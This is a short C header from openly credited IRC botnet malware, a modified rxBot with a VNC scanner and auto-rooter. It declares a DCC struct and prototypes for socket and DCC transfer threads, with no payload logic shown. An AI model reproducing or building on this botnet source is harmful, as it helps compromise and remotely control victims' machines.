/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


typedef struct DCC 
{
	SOCKET sock;
	SOCKET csock;
	char host[MAXHOSTNAME];
	char filename[MAX_PATH];
	char sendto[MAXCHANLEN];
	unsigned short port;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} DCC;

SOCKET CreateSock(char *host, unsigned short port);
DWORD WINAPI DCCSendThread(LPVOID param);
DWORD WINAPI DCCChatThread(LPVOID param);
DWORD WINAPI DCCGetThread(LPVOID param);
